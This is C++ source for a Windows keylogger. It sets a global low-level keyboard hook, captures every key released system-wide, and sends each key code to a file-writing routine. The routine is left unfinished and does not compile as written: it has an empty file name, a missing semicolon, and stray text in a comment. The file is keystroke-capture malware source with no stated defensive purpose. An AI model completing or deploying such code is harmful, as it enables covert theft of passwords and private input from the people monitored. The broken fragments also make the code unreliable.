#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

void WriteToFile(char inputChar)
{
  ofstream outputFile;
  outputFile.open("")
}

//The function that implements the key logging functionality
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
   char pressedKey;
   // Declare a pointer to the KBDLLHOOKSTRUCTdsad
   KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
   switch( wParam )
   {
       case WM_KEYUP: // When the key has been pressed and released
       {
          //get the key code
          pressedKey = (char)pKeyBoard->vkCode;
       }
       break;
       default:
           return CallNextHookEx( NULL, nCode, wParam, lParam );
       break;
   }

    //do something with the pressed key here
    WriteToFile(pressedKey);

   //according to winapi all functions which implement a hook must return by calling next hook
   return CallNextHookEx( NULL, nCode, wParam, lParam);
}

int main()
{
  //Retrieve the applications instance
  HINSTANCE instance = GetModuleHandle(NULL);
  //Set a global Windows Hook to capture keystrokes using the function declared above
  HHOOK test1 = SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);

  MSG Msg;

  //Message loop
  while(GetMessage(&Msg, NULL, 0, 0) > 0)
  {
    TranslateMessage(&Msg);
    DispatchMessage(&Msg);
  }

  return 0;
}

